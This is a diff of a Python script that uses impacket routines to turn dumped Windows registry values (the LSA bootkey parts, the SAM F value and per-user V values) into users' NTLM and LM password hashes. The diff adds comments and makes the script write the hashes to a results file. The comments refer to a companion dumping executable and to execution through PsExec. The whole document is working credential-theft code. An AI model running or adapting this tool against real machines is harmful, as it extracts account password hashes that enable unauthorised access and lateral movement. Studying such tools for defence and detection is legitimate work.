@@ -1,28 +1,23 @@
 # Patrick Sacchet
-
 # Purpose of this script is to utilize output files from our DotNet-Dump executable and calculate user hashes (NTLM) with them
-
 # Credit to impacket for a lot of this decryption; I merely put the pieces together: https://github.com/fortra/impacket
 
 from ctypes import *
 from binascii import unhexlify, hexlify
 import hashlib
-
 from impacket.structure import Structure
 from impacket import ntlm
 from six import b, PY2
 from Cryptodome.Cipher import DES, ARC4, AES
-from Cryptodome.Hash import HMAC, MD4, MD5
+from Cryptodome.Hash import MD5
 from impacket.crypto import transformKey
-
-from struct import pack, unpack
-
+from struct import pack
 import os
 
 
 # Where all our files are written 
-#dirPath = "C:\Windows\SysWOW64\out" # under WOW64 only because we are executing PsExec, not PsExec64
-dirPath = "out"
+dirPath = "C:\Windows\SysWOW64\out" # under WOW64 only because we are executing in a 32 bit context?
+outFile = "results.txt"
 
 class CryptoCommon:
     @staticmethod
@@ -172,13 +167,21 @@ def MD5(data):
         md5.update(data)
         return md5.digest()
 
-
-# Take the bootkey we know and love and actually perform the transforms to get the real bootkey
+'''
+* Take the bootkey we know and love and actually perform the transforms to get the real bootkey
+* Input:
+    * bootKeyValue - byte string of the bootkey (32AFC4...) taken from concatenating:
+        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\JD
+        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\Skew1
+        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\GBG
+        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\Data
+* Return:
+    * transformed bootkey
+'''
 def getRealBootKey(bootKeyValue):
         bootKey = b''
 
         transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
-
         tmpKey = unhexlify(bootKeyValue)
 
         for i in range(len(tmpKey)):
@@ -186,11 +189,17 @@ def getRealBootKey(bootKeyValue):
 
         return bootKey
 
-
+'''
+* Get the 'hashed' bootkey from our plaintext
+* Input:
+    * bootKey - transformed bootkey
+    * fKeyValue - F value read from HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\F
+* Return:
+    * The hashed bootkey
+'''
 def getHBootKey(bootKey, fKeyValue):
         QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
         DIGITS = b"0123456789012345678901234567890123456789\0"
-
         hashedBootKey = ""
 
         F = unhexlify(fKeyValue[:len(fKeyValue)-1])
@@ -218,7 +227,16 @@ def getHBootKey(bootKey, fKeyValue):
 
         return hashedBootKey
 
-
+'''
+* Decrypt either the NT or LM hash assuming its AES encrypted (new style)
+* Input:
+    * rid - this specific user's RID
+    * cryptedHash - hash thats encrypted
+    * bootkey - our updated bootkey 
+    * newStyle - whether this hash is 'new' AKA has been encrypted via AES
+* Return:
+    * decrypted hash for this user
+'''
 def decryptHash(rid, cryptedHash, constant, bootkey, newStyle = False):
         Key1,Key2 = CryptoCommon.deriveKey(rid)
 
@@ -236,22 +254,30 @@ def decryptHash(rid, cryptedHash, constant, bootkey, newStyle = False):
 
         return decryptedHash
 
+'''
+*  Dump the user hashes! Called after we grab all the info
+* Input:
+    * userRids - array of user RIDs taken from HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\Users
+    * userVKeys - array of user V values taken from HKEY_LOCAL_MACHINE\\SAM\\SAM\Domains\\Account\\Users\\<RID>\V
+    * bootkey - hashed bootkey value
+* Return:
+    * N/A (we print all the hashes for all users passed in)
+'''
 def dump(userRids, userVKeys, bootkey):
     NTPASSWORD = b"NTPASSWORD\0"
     LMPASSWORD = b"LMPASSWORD\0"
 
     index = 0 # used to track where we are with our v values since they were both added in order
 
+    # Dump our results to a file
+    openFile = open(dirPath + "/" + outFile, "w")
+
     # Change this to array of our rid V values
     for rid in userRids:
         userAccount = USER_ACCOUNT_V(unhexlify(userVKeys[index][:len(userVKeys[index])-1]))
         rid = int(rid,16)
 
-
-
         V = userAccount['Data']
-
-
 
         userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')
 
@@ -291,12 +317,8 @@ def dump(userRids, userVKeys, bootkey):
 
         answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash).decode('utf-8'), hexlify(ntHash).decode('utf-8'))
         print(answer)
+        openFile.write(answer + '\n')
         index += 1
-
-
-
-
-
 
 def main():
     userRidValues = []
@@ -304,22 +326,14 @@ def main():
 
     # Grab our bootkey 
     bootKeyValue = open(dirPath + "/bootkey.txt", "r").readline()
-
-    #print("Bootkey value from file is " + bootKeyValue)
-
     realBootKey = getRealBootKey(bootKeyValue[:32])
-
-    #print("Real bootkey is " + str(realBootKey))
 
     # Get the hashed bootkey
     print("Getting hashed bootkey...")
 
     # Grab our F value
     fKeyValue = open(dirPath + "/fkey.txt", "r").readline()
-
     hBootKey = getHBootKey(realBootKey, fKeyValue)
-
-    #print("Hashed bootkey is " + str(hBootKey))
 
     for file in os.listdir(dirPath):
         # Dont read the files we've read and dont need
@@ -332,9 +346,7 @@ def main():
     # Pass over to dump 
     dump(userRidValues, userVValues, hBootKey)
 
-
     return
-
 
 
 if __name__ == '__main__':
